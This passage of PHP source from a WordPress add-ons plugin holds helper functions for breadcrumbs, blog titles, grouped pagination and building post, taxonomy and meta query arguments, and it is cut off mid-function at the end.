		if ( is_front_page() ) return '';//is_home() || 

		if ( $args['max_levels']<=0 ) $args['max_levels'] = 999;
		$level = 1 + (isset($args['home']) && $args['home']!='' ? 1 : 0);	// Current element + Home
		
		$rez = $rez_all = $rez_parent = $rez_level = '';
		
		// Get link to the 'All posts (products, events, etc.)' page
		if ($level >= $args['max_levels'])
			$rez_level = '...';
		else {
			$rez_all = apply_filters('trx_addons_filter_get_blog_all_posts_link', '', $args);
			if ( ! empty( $rez_all ) && $rez_all != '#' ) $level++;			// All posts
		}

		$cat = $parent_tax = '';
		$parent = $post_id = 0;

		// Get current post ID and path to current post/page/attachment ( if it have parent posts/pages )
		if ( is_page() || is_attachment() || trx_addons_is_single() ) {
			$page_parent_id = apply_filters('trx_addons_filter_get_parent_id',
											isset($wp_query->post->post_parent) ? $wp_query->post->post_parent : 0,
											isset($wp_query->post->ID) ? $wp_query->post->ID : 0);
			$post_id = (is_attachment() 
							? $page_parent_id 
							: (isset($wp_query->post->ID) 
									? $wp_query->post->ID 
									: 0
								)
						);
			while ($page_parent_id > 0) {
				$page_parent = get_post($page_parent_id);
				if ($level >= $args['max_levels'])
					$rez_level = '...';
				else {
					$rez_parent = '<a class="breadcrumbs_item cat_post" href="' . esc_url(get_permalink($page_parent_id)) . '">' 
									. wp_kses_data( trx_addons_strshort( $page_parent->post_title, $args['truncate_title'], $args['truncate_add'] ) )
									. '</a>' 
									. (!empty($rez_parent) ? $args['delimiter'] : '') 
									. ($rez_parent);
					$level++;
				}
				if (($page_parent_id = apply_filters('trx_addons_filter_get_parent_id', $page_parent->post_parent, $page_parent_id)) > 0) $post_id = $page_parent_id;
			}
		}
		// Show parents
		$step = 0;
		do {
			if ($step++ == 0) {
				if (trx_addons_is_single() || is_attachment()) {
					$post_type = get_post_type();
					if ($post_type == 'post') {
						$cats = get_the_category();
						$cat = !empty($cats[0]) ? $cats[0] : false;
					} else {
						$tax = trx_addons_get_post_type_taxonomy($post_type);
						if (!empty($tax)) {
							$cats = get_the_terms(get_the_ID(), $tax);
							$cat = !empty($cats[0]) ? $cats[0] : false;
						}
					}
					if ($cat) {
						if ($level >= $args['max_levels'])
							$rez_level = '...';
						else {
							$rez_parent = '<a class="breadcrumbs_item cat_post" href="'.esc_url(get_term_link($cat->term_id, $cat->taxonomy)).'">' 
											. apply_filters( 'trx_addons_filter_term_name', trx_addons_strshort( $cat->name, $args['truncate_title'], $args['truncate_add'] ), $cat )
											. '</a>' 
											. (!empty($rez_parent) ? $args['delimiter'] : '') 
											. ($rez_parent);
							$level++;
						}
					}
				} else if ( is_category() ) {
					$cat_id = (int) get_query_var( 'cat' );
					if (empty($cat_id)) $cat_id = get_query_var( 'category_name' );
					$cat = get_term_by( is_numeric( $cat_id ) && (int) $cat_id > 0 ? 'id' : 'slug', $cat_id, 'category', OBJECT);
				} else if ( is_tag() ) {
					$cat = get_term_by( 'slug', get_query_var( 'post_tag' ), 'post_tag', OBJECT);
				} else if ( is_tax() ) {
					$cat = $wp_query->get_queried_object();
				}
				if ($cat) {
					$parent = $cat->parent;
					$parent_tax = $cat->taxonomy;
				}
			}
			if ($parent) {
				$cat = get_term_by( 'id', $parent, $parent_tax, OBJECT);
				if ($cat) {
					$cat_link = get_term_link($cat->slug, $cat->taxonomy);
					if ($level >= $args['max_levels'])
						$rez_level = '...';
					else {
						$rez_parent = '<a class="breadcrumbs_item cat_parent" href="'.esc_url($cat_link).'">' 
										. apply_filters( 'trx_addons_filter_term_name', trx_addons_strshort( $cat->name, $args['truncate_title'], $args['truncate_add'] ), $cat )
										. '</a>' 
										. (!empty($rez_parent) ? $args['delimiter'] : '') 
										. ($rez_parent);
						$level++;
					}
					$parent = $cat->parent;
				}
			}
		} while ($parent);

		$rez_parent = apply_filters('trx_addons_filter_get_parents_links', $rez_parent, $args);

		$rez_period = '';
		if ( ( is_day() || is_month() ) && is_object( $post ) ) {
			$year  = get_the_time('Y'); 
			$month = get_the_time('m'); 
			$rez_period = '<a class="breadcrumbs_item cat_parent" href="' . get_year_link( $year ) . '">' . ($year) . '</a>';
			if (is_day())
				$rez_period .= (!empty($rez_period) ? $args['delimiter'] : '') 
							. '<a class="breadcrumbs_item cat_parent" href="' . esc_url(get_month_link( $year, $month )) . '">'
								. esc_html( get_the_date('F') ) 
							. '</a>';
		}

		if ( ! is_front_page() ) {	// && !is_home()

			$title = trx_addons_get_blog_title();
			if ( is_array($title) ) $title = $title['text'];
			$title = trx_addons_strshort( $title, $args['truncate_title'], $args['truncate_add'] );

			$rez .= (isset($args['home']) && $args['home']!='' 
					? '<a class="breadcrumbs_item home" href="' . esc_url($args['home_link'] ? $args['home_link'] : home_url('/')) . '">'
						. ($args['home'])
						. '</a>'
						. ($args['delimiter']) 
					: '') 
				. ( ! empty( $rez_all ) && $rez_all != '#' ? ( $rez_all ) . ( $args['delimiter'] ) : '' )
				. ( ! empty( $rez_level )  ? ( $rez_level )  . ( $args['delimiter'] ) : '' )
				. ( ! empty( $rez_parent ) ? ( $rez_parent ) . ( $args['delimiter'] ) : '' )
				. ( ! empty( $rez_period ) ? ( $rez_period ) . ( $args['delimiter'] ) : '' )
				. ( ! empty( $title )      ? '<span class="breadcrumbs_item current">' . wp_kses_data( $title ) . '</span>' : '' );
		}

		return apply_filters( 'trx_addons_filter_get_breadcrumbs', $rez );
	}
}

// Return link to the main posts page for the breadcrumbs
if ( ! function_exists( 'trx_addons_get_blog_all_posts_link' ) ) {
	add_filter( 'trx_addons_filter_get_blog_all_posts_link', 'trx_addons_get_blog_all_posts_link', 10, 2);
	function trx_addons_get_blog_all_posts_link($link='', $args=array()) {
		if ( $link == '' ) {
			if ( trx_addons_is_posts_page() && !is_home() ) {	// ! is_post_type_archive( 'post' )
				if ( ( $url = get_post_type_archive_link( 'post' ) ) != '' ) {
					$obj = get_post_type_object( 'post' );
					$link = '<a href="' . esc_url( $url ) . '">' . esc_html( $obj->labels->all_items ) . '</a>';
				}
			}
		}
		return $link;
	}
}

// Return true if it's 'posts' page
if ( ! function_exists( 'trx_addons_is_posts_page' ) ) {
	function trx_addons_is_posts_page() {
		return ! is_search()
					&& (
						(trx_addons_is_single() && get_post_type()=='post')
						|| is_category()
						|| is_tag()
						);
	}
}


// Return link to the 'All posts' for CPT in the breadcrumbs
if ( ! function_exists( 'trx_addons_cpt_custom_get_blog_all_posts_link' ) ) {
	add_filter('trx_addons_filter_get_blog_all_posts_link', 'trx_addons_cpt_custom_get_blog_all_posts_link', 1000, 2);
	function trx_addons_cpt_custom_get_blog_all_posts_link($link='', $args=array()) {
		if ($link=='' && !is_search()) {
			$pt = '';
			if (trx_addons_is_single()) {
				$pt = get_post_type();
			} else {
				$obj = get_queried_object();
				if (!empty($obj->taxonomy)) {
					$tax = get_taxonomy($obj->taxonomy);
					if (!empty($tax->object_type[0]))
						$pt = $tax->object_type[0];
				}
			}
			if (!empty($pt)) {
				$obj = get_post_type_object($pt);
				if (($url = get_post_type_archive_link($pt)) != '')
					$link = '<a href="'.esc_url($url).'">'.esc_html($obj->labels->all_items).'</a>';
			}
		}
		return $link;
	}
}

// Return blog title
if ( ! function_exists('trx_addons_get_blog_title') ) {
	function trx_addons_get_blog_title() {
		if ( is_front_page() ) {
			$title = esc_html__( 'Home', 'trx_addons' );
		} else if ( is_home() ) {
			$title = get_option( 'page_for_posts' ) == get_queried_object_id()
						? get_the_title( get_queried_object_id() )
						: esc_html__( 'All Posts', 'trx_addons' );
		} else if ( is_author() ) {
			$curauth = get_query_var( 'author_name' ) ? get_user_by( 'slug', get_query_var( 'author_name' ) ) : get_userdata( get_query_var( 'author' ) );
			$title = sprintf( esc_html__( 'Author page: %s', 'trx_addons' ), $curauth->display_name );
		} else if ( is_404() ) {
			$title = esc_html__( 'URL not found', 'trx_addons' );
		} else if ( is_search() ) {
			$title = sprintf( esc_html__( 'Search: %s', 'trx_addons' ), get_search_query() );
		} else if ( is_day() ) {
			$title = sprintf( esc_html__( 'Daily Archives: %s', 'trx_addons' ), get_the_date() );
		} else if ( is_month() ) {
			$title = sprintf( esc_html__( 'Monthly Archives: %s', 'trx_addons' ), get_the_date( 'F Y' ) );
		} else if ( is_year() ) {
			$title = sprintf( esc_html__( 'Yearly Archives: %s', 'trx_addons' ), get_the_date( 'Y' ) );
		} else if ( is_category() ) {
			$title = sprintf( esc_html__( '%s', 'trx_addons' ), single_cat_title( '', false ) );
		} else if ( is_tag() ) {
			$title = sprintf( esc_html__( 'Tag: %s', 'trx_addons' ), single_tag_title( '', false ) );
		} else if ( is_tax() ) {
			$title = single_term_title( '', false );
		} else if ( is_post_type_archive() ) {
			$obj = get_queried_object();
			$title = ! empty( $obj->labels->all_items )
						? $obj->labels->all_items 
						: ( ! empty( $obj->post_title )
							? $obj->post_title
							: '' );
		} else if ( is_attachment() ) {
			$title = sprintf( esc_html__( 'Attachment: %s', 'trx_addons' ), get_the_title() );
		} else if ( trx_addons_is_single() || is_page() ) {
			$title = get_the_title();
		} else if ( trx_addons_is_preview() ) {		// Default title to display it inside page builders
			$title = esc_html__( 'Page (post) title', 'trx_addons' );
		} else {
			$title = get_the_title();	// get_bloginfo('name', 'raw');
		}
		return apply_filters( 'trx_addons_filter_get_blog_title', $title );
	}
}



/* Blog pagination
------------------------------------------------------------------------------------- */

// Show simple pagination
if ( ! function_exists('trx_addons_show_pagination') ) {
	function trx_addons_show_pagination($pagination='pages') {
		global $wp_query;
		// Pagination
		if ($pagination == 'pages') {
			the_posts_pagination( array(
				'mid_size'  => 2,
				'prev_text' => esc_html__( '<', 'trx_addons' ),
				'next_text' => esc_html__( '>', 'trx_addons' ),
				'before_page_number' => '<span class="meta-nav screen-reader-text">' . esc_html__( 'Page', 'trx_addons' ) . ' </span>',
			) );
		} else if ($pagination == 'links') {
			?>
			<div class="nav-links-old">
				<span class="nav-prev"><?php previous_posts_link( is_search() ? esc_html__('Previous posts', 'trx_addons') : esc_html__('Newest posts', 'trx_addons') ); ?></span>
				<span class="nav-next"><?php next_posts_link( is_search() ? esc_html__('Next posts', 'trx_addons') : esc_html__('Older posts', 'trx_addons'), $wp_query->max_num_pages ); ?></span>
			</div>
			<?php
		}
	}
}

// Show pagination with group pages: [1-10][11-20]...[24][25][26]...[31-40][41-45]
if ( ! function_exists('trx_addons_pagination') ) {
	function trx_addons_pagination($args=array()) {
		$args = array_merge(array(
			'class' => '',				// Additional 'class' attribute for the pagination section
			'button_class' => '',		// Additional 'class' attribute for the each page button
			'base_link' => '',			// Base link for each page. If specified - all pages use it and add '&page=XX' to the end of this link. Else - use get_pagenum_link()
			'total_posts' => 0,			// Total posts number
			'posts_per_page' => 0,		// Posts per page
			'total_pages' => 0,			// Total pages (instead total_posts, otherwise - calculate number of pages)
			'cur_page' => 0,			// Current page
			'near_pages' => 2,			// Number of pages to be displayed before and after the current page
			'group_pages' => 10,		// How many pages in group
			'pages_text' => '', 		//__('Page %CURRENT_PAGE% of %TOTAL_PAGES%', 'trx_addons'),
			'cur_text' => "%PAGE_NUMBER%",
			'page_text' => "%PAGE_NUMBER%",
			'first_text'=> __('&laquo; First', 'trx_addons'),
			'last_text' => __("Last &raquo;", 'trx_addons'),
			'prev_text' => __("&laquo; Prev", 'trx_addons'),
			'next_text' => __("Next &raquo;", 'trx_addons'),
			'dot_text' => "&hellip;",
			'before' => '',
			'after' => ''
			),  is_array($args) ? $args 
				: (is_int($args) ? array( 'cur_page' => $args ) 		// If send number parameter - use it as offset
					: array( 'class' => $args )));						// If send string parameter - use it as 'class' name
		if (empty($args['before']))	$args['before'] = '<div class="trx_addons_pagination'.(!empty($args['class']) ? ' '.$args['class'] : '').'">';
		if (empty($args['after'])) 	$args['after'] = '</div>';
		
		extract($args);
		
		global $wp_query;
	
		// Detect total pages
		if ($total_pages == 0) {
			if ($total_posts == 0) $total_posts = $wp_query->found_posts;
			if ($posts_per_page == 0) $posts_per_page = (int) get_query_var('posts_per_page');
			$total_pages = ceil($total_posts / $posts_per_page);
		}
		
		if ($total_pages < 2) return;
		
		// Detect current page
		if ($cur_page == 0) {
			$cur_page = (int) get_query_var('paged');
			if ($cur_page == 0) $cur_page = (int) get_query_var('page');
			if ($cur_page <= 0) $cur_page = 1;
		}
		// Near pages
		$show_pages_start = $cur_page - $near_pages;
		$show_pages_end = $cur_page + $near_pages;
		// Current group
		$cur_group = ceil($cur_page / $group_pages);
	
		$output = $before;
	
		// Page XX from XXX
		if ($pages_text) {
			$pages_text = str_replace(
				array("%CURRENT_PAGE%", "%TOTAL_PAGES%"),
				array(number_format_i18n($cur_page),number_format_i18n($total_pages)),
				$pages_text);
			$output .= '<span class="'.esc_attr($class).'_pages '.$button_class.'">' . $pages_text . '</span>';
		}
		if ($cur_page > 1) {
			// First page
			$first_text = str_replace("%TOTAL_PAGES%", number_format_i18n($total_pages), $first_text);
			$output .= '<a href="'.esc_url($base_link ? $base_link.'&page=1' : get_pagenum_link()).'" data-page="1" class="'.esc_attr($class).'_first '.$button_class.'">'.$first_text.'</a>';
			// Prev page
			$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.($cur_page-1) : get_pagenum_link($cur_page-1)).'" data-page="'.esc_attr($cur_page-1).'" class="'.esc_attr($class).'_prev '.$button_class.'">'.$prev_text.'</a>';
		}
		// Page buttons
		$group = 1;
		$dot1 = $dot2 = false;
		for ($i = 1; $i <= $total_pages; $i++) {
			if ($i % $group_pages == 1) {
				$group = ceil($i / $group_pages);
				if ($group != $cur_group)
					$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.$i : get_pagenum_link($i)).'" data-page="'.esc_attr($i).'" class="'.esc_attr($class).'_group '.$button_class.'">'.$i.'-'.min($i+$group_pages-1, $total_pages).'</a>';
			}
			if ($group == $cur_group) {
				if ($i < $show_pages_start) {
					if (!$dot1) {
						$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.($show_pages_start-1) : get_pagenum_link($show_pages_start-1)).'" data-page="'.esc_attr($show_pages_start-1).'" class="'.esc_attr($class).'_dot '.$button_class.'">'.$dot_text.'</a>';
						$dot1 = true;
					}
				} else if ($i > $show_pages_end) {
					if (!$dot2) {
						$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.($show_pages_end+1) : get_pagenum_link($show_pages_end+1)).'" data-page="'.esc_attr($show_pages_end+1).'" class="'.esc_attr($class).'_dot '.$button_class.'">'.$dot_text.'</a>';
						$dot2 = true;
					}
				} else if ($i == $cur_page) {
					$cur_text = str_replace("%PAGE_NUMBER%", number_format_i18n($i), $cur_text);
					$output .= '<span class="'.esc_attr($class).'_current active '.$button_class.'">'.$cur_text.'</span>';
				} else {
					$text = str_replace("%PAGE_NUMBER%", number_format_i18n($i), $page_text);
					$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.trim($i) : get_pagenum_link($i)).'" data-page="'.esc_attr($i).'" class="'.$button_class.'">'.$text.'</a>';
				}
			}
		}
		if ($cur_page < $total_pages) {
			// Next page
			$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.($cur_page+1) : get_pagenum_link($cur_page+1)).'" data-page="'.esc_attr($cur_page+1).'" class="'.esc_attr($class).'_next '.$button_class.'">'.$next_text.'</a>';
			// Last page
			$last_text = str_replace("%TOTAL_PAGES%", number_format_i18n($total_pages), $last_text);
			$output .= '<a href="'.esc_url($base_link ? $base_link.'&page='.trim($total_pages) : get_pagenum_link($total_pages)).'" data-page="'.esc_attr($total_pages).'" class="'.esc_attr($class).'_last '.$button_class.'">'.$last_text.'</a>';
		}
		$output .= $after;
		trx_addons_show_layout($output);
	}
}


// Return current page number
if ( ! function_exists('trx_addons_get_current_page') ) {
	function trx_addons_get_current_page() {
		if ( ($page = trx_addons_get_value_gp('page', -999)) == -999) {
			if ( ! ($page = get_query_var('paged')) ) {
				if ( ! ($page = get_query_var('page')) ) {
					$page = 1;
				}
			}
		}
		return $page;
	}
}

// Return current post ID before loop
if ( ! function_exists('trx_addons_get_the_ID') ) {
	function trx_addons_get_the_ID() {
		global $wp_query;
		return trx_addons_in_the_loop() 
					? get_the_ID() 
					: ( ! empty( $wp_query->post->ID )
						? $wp_query->post->ID
						: ( trx_addons_is_singular() && ! empty( $wp_query->queried_object->ID )
							? $wp_query->queried_object->ID
							: 0
							)
						);
	}
}

// Return current post ID before loop
if ( ! function_exists('trx_addons_in_the_loop') ) {
	function trx_addons_in_the_loop() {
		$rez = in_the_loop();
		if ( ! $rez ) {
			global $TRX_ADDONS_STORAGE;
			if ( ! empty( $TRX_ADDONS_STORAGE['sc_list'] ) && is_array( $TRX_ADDONS_STORAGE['sc_list'] ) ) {
				foreach ( $TRX_ADDONS_STORAGE['sc_list'] as $sc => $params ) {
					if ( ! empty( $params['post_loop'] ) ) {
						$rez = trx_addons_sc_stack_check( "trx_sc_{$sc}", true );	// Check if last stack element is post_loop shoctcode
						if ( $rez ) {
							break;
						}
					}
				}
			}
			if ( ! $rez && ! empty( $TRX_ADDONS_STORAGE['cpt_list'] ) && is_array( $TRX_ADDONS_STORAGE['cpt_list'] ) ) {
				foreach ( $TRX_ADDONS_STORAGE['cpt_list'] as $sc => $params ) {
					if ( ! empty( $params['post_loop'] ) ) {
						$rez = trx_addons_sc_stack_check( "trx_sc_{$sc}", true );	// Check if last stack element is post_loop shoctcode
						if ( $rez ) {
							break;
						}
					}
				}
			}
		}
		return $rez;
	}
}


// Return true if current mode is singular
if ( ! function_exists( 'trx_addons_is_singular' ) ) {
	function trx_addons_is_singular( $type='' ) {
		global $wp_query;
		return apply_filters( 'trx_addons_filter_is_singular', ! empty( $wp_query->queried_object->ID ) && is_singular( $type ), $type );	// did_action( 'wp_loaded' ) &&
	}
}


// Return true if current mode is single
if ( ! function_exists( 'trx_addons_is_single' ) ) {
	function trx_addons_is_single() {
		global $wp_query;
		return apply_filters( 'trx_addons_filter_is_single', ! empty( $wp_query->queried_object->ID ) && is_single() );		// did_action( 'wp_loaded' ) &&
	}
}



/* Query manipulations
------------------------------------------------------------------------------------- */

// Add sorting parameter in query arguments
if ( ! function_exists('trx_addons_query_add_sort_order') ) {
	function trx_addons_query_add_sort_order( $args, $orderby = 'date', $order = 'desc' ) {
		if ( ! empty( $orderby ) && ( empty( $args['orderby'] ) || $orderby != 'none' ) ) {
			$q          = apply_filters( 'trx_addons_filter_add_sort_order', array(), $orderby, $order );
			$q['order'] = 'asc' == $order ? 'asc' : 'desc';
			if ( empty( $q['orderby'] ) ) {
				if ($orderby == 'none') {
					$q['orderby'] = 'none';
				} else if ($orderby == 'ID') {
					$q['orderby'] = 'ID';
				} else if ($orderby == 'comments') {
					$q['orderby'] = 'comment_count';
				} else if ($orderby == 'title' || $orderby == 'alpha') {
					$q['orderby'] = 'title';
				} else if ($orderby == 'rand' || $orderby == 'random')  {
					$q['orderby'] = 'rand';
				} else if ($orderby == 'update' || $orderby == 'post_update' || $orderby == 'post_modified') {
					$q['orderby'] = 'post_modified';
				} else {
					$q['orderby'] = 'post_date';
				}
			}
			foreach ( $q as $mk => $mv ) {
				if ( is_array( $args ) ) {
					$args[ $mk ] = $mv;
				} else {
					$args->set( $mk, $mv );
				}
			}
		}
		return apply_filters( 'trx_addons_filter_add_sort_order_args', $args, $orderby, $order );
	}
}

// Add query params to sort posts by views or likes
if ( ! function_exists( 'trx_addons_query_sort_order_views_likes' ) ) {
	add_filter('trx_addons_filter_add_sort_order', 'trx_addons_query_sort_order_views_likes', 10, 3);
	function trx_addons_query_sort_order_views_likes( $q = array(), $orderby = 'date', $order = 'desc' ) {
		if ( 'views' == $orderby ) {
			$q['orderby']  = 'meta_value_num';
			$q['meta_key'] = 'trx_addons_post_views_count';
		} elseif ( 'likes' == $orderby ) {
			$q['orderby']  = 'meta_value_num';
			$q['meta_key'] = 'trx_addons_post_likes_count';
		}
		return $q;
	}
}

// Add post type and posts list or categories list in query arguments
if ( ! function_exists('trx_addons_query_add_posts_and_cats') ) {
	function trx_addons_query_add_posts_and_cats($args, $ids='', $post_type='', $cat='', $taxonomy='') {
		if (!empty($ids)) {
			$args['post_type'] = empty($args['post_type']) 
									? 'any'	//(empty($post_type) ? 'any' : $post_type)
									: $args['post_type'];
			$args['post__in'] = explode(',', str_replace(array(';', ' '), array(',', ''), $ids));
			if (empty($args['posts_per_page'])) $args['posts_per_page'] = count($args['post__in']);
			if (empty($args['orderby']) || $args['orderby'] == 'none') {
				$args['orderby'] = 'post__in';
				if (isset($args['order'])) unset($args['order']);
			}
		} else {
			$args['post_type'] = empty($args['post_type']) || !empty($post_type)
									? (empty($post_type) ? 'post' : $post_type)
									: $args['post_type'];
			$post_type = is_array($args['post_type']) ? $args['post_type'][0] : $args['post_type'];
			if (!empty($cat)) {
				$cats = !is_array($cat) ? explode(',', $cat) : $cat;
				if (empty($taxonomy)) {
					$taxonomy = 'category';
				}
				if ($taxonomy == 'category') {				// Add standard categories
					if ( is_array($cats) && count($cats) > 1 ) {
						$cats_ids = array();
						foreach($cats as $c) {
							$c = trim(chop($c));
							if ( empty($c) ) continue;
							if ( (int) $c == 0 ) {
								$cat_term = get_term_by( 'slug', $c, $taxonomy, OBJECT);
								if ($cat_term) $c = $cat_term->term_id;
							}
							if ( $c == 0 ) continue;
							$cats_ids[] = (int) $c;
							$children = get_categories( array(
								'type'                     => $post_type,
								'child_of'                 => $c,
								'hide_empty'               => 0,
								'hierarchical'             => 0,
								'taxonomy'                 => $taxonomy,
								'pad_counts'               => false
							));
							if (is_array($children) && count($children) > 0) {
								foreach($children as $c) {
									if (!in_array((int) $c->term_id, $cats_ids)) $cats_ids[] = (int) $c->term_id;
								}
							}
						}
						if (count($cats_ids) > 0) {
							$args['category__in'] = $cats_ids;
						}
					} else if ( ! empty( $cats ) ) {
						$cat = trx_addons_array_get_first_value( $cats );
						if ((int) $cat > 0) {
							$args['cat'] = (int) $cat;
						} else {
							$args['category_name'] = $cat;
						}
					}
				} else {
					$cat = trx_addons_array_get_first_value( $cats );
					if ( ! empty( $cat ) ) {			// Add custom taxonomies
						if ( ! isset( $args['tax_query'] ) ) {
							$args['tax_query'] = array();
						}
						$args['tax_query']['relation'] = 'AND';
						$args['tax_query'][] = array(
							'taxonomy' => $taxonomy,
							'include_children' => true,
							'field'    => (int) $cat > 0 ? 'id' : 'slug',
							'terms'    => $cats
						);
					}
				}
			}
		}
		return $args;
	}
}

// Add taxonomy parameters in query arguments
if ( ! function_exists('trx_addons_query_add_taxonomy') ) {
	function trx_addons_query_add_taxonomy($args, $taxonomy=array(), $value=false) {
		if (!is_array($taxonomy)) {
			$value = !is_array($value) ? explode(',', $value) : $value;
			$taxonomy = array(
				array(
					'taxonomy' => $taxonomy,
					'include_children' => true,
					'field'    => (int) $value[0] > 0 ? 'id' : 'slug',
					'terms'    => count($value) > 1 ? $value : $value[0]
					)
				);
		}
		foreach ($taxonomy as $v) {
			if (!isset($args['tax_query'])) {
				$args['tax_query'] = array();
				$args['tax_query']['relation'] = 'AND';
			}
			$args['tax_query'][] = $v;
		}
		return $args;
	}
}

// Add meta parameters in query arguments
if ( ! function_exists('trx_addons_query_add_meta') ) {
	function trx_addons_query_add_meta($args, $meta=array(), $value=false) {
		if (!is_array($meta)) {
			$value = explode(',', $value);
			if (count($value) == 1 || $value[0]==$value[1]) {
				$value = $value[0];
			}
			$meta = array(
				array(
					'key' => $meta,
					'value' => is_array($value) ? array_map('floatval', $value) : $value,
					'compare' => is_array($value) ? 'BETWEEN' : '=',
					'type' => is_array($value) ? 'DECIMAL(14,3)' : 'CHAR'
					)
				);
		}
		foreach ($meta as $v) {
			if (!isset($args['meta_query'])) {
				$args['meta_query'] = array();
				$args['meta_query']['relation'] = 'AND';
			}
			$args['meta_query'][] = $v;
		}
		return $args;
	}
}

// Add filters (meta parameters) in query arguments
if ( ! function_exists('trx_addons_query_add_filters') ) {
	function trx_addons_query_add_filters($args, $filters=false) {
		if ( ! empty($filters) ) {
			if ( ! is_array($filters) ) {
				$filters = array($filters);
			}
			foreach ($filters as $v) {
				$found = false;
				if ($v == 'thumbs') {							// Filter with meta_query
					if ( ! isset($args['meta_query']) ) {
						$args['meta_query'] = array();
					} else {
						for ($i=0; $i<count($args['meta_query']); $i++) {
							if ($args['meta_query'][$i]['meta_filter'] == $v) {
								$found = true;
								break;
							}
						}
					}
					if ( ! $found ) {
						$args['meta_query']['relation'] = 'AND';
						if ($v == 'thumbs') {
							$args['meta_query'][] = array(
								'meta_filter' => $v,
								'key' => '_thumbnail_id',
								'value' => false,
								'compare' => '!='
							);
						}
					}
				} else if ( in_array($v, array('video', 'audio', 'gallery')) ) {			// Filter with tax_query
					if (!isset($args['tax_query'])) {
						$args['tax_query'] = array();
					} else {
						for ($i=0; $i<count($args['tax_query']); $i++) {
							if ($args['tax_query'][$i]['tax_filter'] == $v) {
								$found = true;
								break;
							}
						}
					}
					if (!$found) {
						$args['tax_query']['relation'] = 'AND';
						if ($v == 'video') {
							$args['tax_query'][] = array(
								'tax_filter' => $v,
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-video' )
							);
						} else if ($v == 'audio') {
							$args['tax_query'] = array(
								'tax_filter' => $v,
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-audio' )
							);
						} else if ($v == 'gallery') {
							$args['tax_query'] = array(
								'tax_filter' => $v,
								'taxonomy' => 'post_format',
								'field' => 'slug',
								'terms' => array( 'post-format-gallery' )
							);
						}
					}
				} else {
					$args = apply_filters('trx_addons_filter_query_add_filters', $args, $v);
				}
			}
		}
		return $args;
	}
}

// Return string with categories links
if ( ! function_exists('trx_addons_get_post_categories') ) {
	function trx_addons_get_post_categories($delimiter=', ', $id=false, $links=true) {
		return trx_addons_get_post_terms($delimiter, $id, '', $links);
	}
}

// Return string with terms links
if ( ! function_exists('trx_addons_get_post_terms') ) {
	function trx_addons_get_post_terms($delimiter=', ', $id=false, $taxonomy='category', $links=true) {
		$output = '';
		if (empty($id)) $id = get_the_ID();
		if (empty($taxonomy)) $taxonomy = trx_addons_get_post_type_taxonomy(get_post_type($id));
		$terms = get_the_terms($id, $taxonomy);
		if ( !empty( $terms ) && is_array($terms) ) {
			$cnt = count($terms);
			$i = 0;
			foreach( $terms as $term ) {
				if (empty($term->term_id)) continue;
				$i++;
				$output .= ($links 
									? '<a href="' . esc_url( get_term_link( $term->term_id, $taxonomy ) ) . '"'
											. ' title="' . esc_attr( sprintf( __( 'View all posts in %s', 'trx_addons' ), strip_tags( $term->name ) ) ) . '"'
											. '>'
									: '<span>'
								)
								. apply_filters( 'trx_addons_filter_term_name', $term->name, $term ) 
								. ($i < $cnt ? $delimiter : '') 
							. ($links ? '</a>' : '</span>');
			}
		}
		return $output;
	}
}

// Return terms objects by taxonomy name (directly from db)
if ( ! function_exists('trx_addons_get_terms_by_taxonomy_from_db') ) {
	function trx_addons_get_terms_by_taxonomy_from_db($tax_types = 'post_format', $opt=array()) {
		global $wpdb;
		if (!is_array($tax_types))
			$tax_types = array($tax_types);
		if (!is_array($opt['meta_query']) && !empty($opt['meta_key']) && !empty($opt['meta_value'])) {
			$mq = array(
					'key' => $opt['meta_key'],
					'value' => $opt['meta_value']
				);
			if ( ! empty($opt['meta_type'] ) ) {
				$mq['type'] = $opt['meta_type'];
			}
			if ( ! empty($opt['meta_compare'] ) ) {
				$mq['compare'] = $opt['meta_compare'];
			}
			$opt['meta_query'] = array( $mq );
		}
		$join = $where = '';
		$keys = array();
		if (is_array($opt['meta_query']) && count($opt['meta_query']) > 0) {
			$i = 0;
			foreach ($opt['meta_query'] as $q) {
				$i++;
				$join .= " LEFT JOIN {$wpdb->termmeta} AS taxmeta{$i} ON taxmeta{$i}.term_id=terms.term_id";
				$where .= " AND taxmeta{$i}.meta_key='%s' AND taxmeta{$i}.meta_value='%s'";
				$keys[] = $q['key'];
				$keys[] = $q['value'];
			}
		}
		if (!empty($opt['parent'])) {
				$where .= " AND parent='{$opt['parent']}'";
		}
		$terms = $wpdb->get_results( $wpdb->prepare("SELECT DISTINCT terms.*, tax.taxonomy, tax.parent, tax.count"
														. " FROM {$wpdb->terms} AS terms"
														. " LEFT JOIN {$wpdb->term_taxonomy} AS tax ON tax.term_id=terms.term_id"
														. (!empty($join) ? $join : '')
														. " WHERE tax.taxonomy IN ('" . join(",", array_fill(0, count($tax_types), '%s')) . "')"
														. (!empty($where) ? $where : '')
														. " ORDER BY terms.name",
													array_merge($tax_types, $keys)),
									OBJECT
									);
		for ($i=0; $i<count($terms); $i++) {
			$terms[$i]->link = get_term_link($terms[$i]->slug, $terms[$i]->taxonomy);
		}
		return $terms;
	}
}


// Return taxonomy for current post type
if ( ! function_exists( 'trx_addons_get_post_type_taxonomy' ) ) {
	function trx_addons_get_post_type_taxonomy($post_type='') {
		if ( empty($post_type) ) {
			$post_type = get_post_type();
		}
		if ($post_type == 'post') {
			$tax = 'category';
		} else {
	        $taxonomy_names = get_object_taxonomies( $post_type );
			$tax = !empty($taxonomy_names[0]) ? $taxonomy_names[0] : '';
		}
		return apply_filters( 'trx_addons_filter_post_type_taxonomy', $tax, $post_type );
	}
}

// Return meta value of the specified term
if ( ! function_exists('trx_addons_get_term_meta') ) {
	function trx_addons_get_term_meta($args) {
		static $meta = array();
		$args = array_merge(array(
							'taxonomy' => 'category',
							'term_id' => 0,
							'key' => 'value',
							'check_parents' => false
							),
							is_array($args) ? $args : array('term_id' => $args));
		$val = '';
		if ($args['term_id'] == 0) {
			if ($args['taxonomy']=='category') {
				if (is_category()) {
					$args['term_id'] = (int) get_query_var('cat');
				}
			} else if (!empty($args['taxonomy'])) {
				if (is_tax($args['taxonomy'])) {
					$term = get_term_by('slug', get_query_var($args['taxonomy']), $args['taxonomy'], OBJECT);
					if (!empty($term->term_id)) {
